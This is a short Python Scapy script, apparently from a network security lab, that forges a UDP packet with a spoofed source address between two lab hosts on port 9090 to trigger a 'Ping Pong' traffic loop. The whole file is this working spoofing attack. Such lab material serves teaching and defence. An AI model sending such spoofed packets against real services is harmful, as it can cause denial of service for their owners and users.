#!/bin/env python3
import socket
from scapy.all import *

# TODO: IP & port configuration
# Tip: suffix
IP_victim1_src = "10.9.0.5"
IP_victim2_dst = "10.9.0.6"
port_src = 9090
port_dst = 9090

ip = IP(src=IP_victim1_src,dst=IP_victim2_dst)
udp = UDP(sport=port_src,dport=port_dst)
data = "Let the Ping Pong game start!\n"
pkt = ip/udp/data

print("Ping Pong Attack: {A}".format(A=data))
send(pkt,verbose=0)
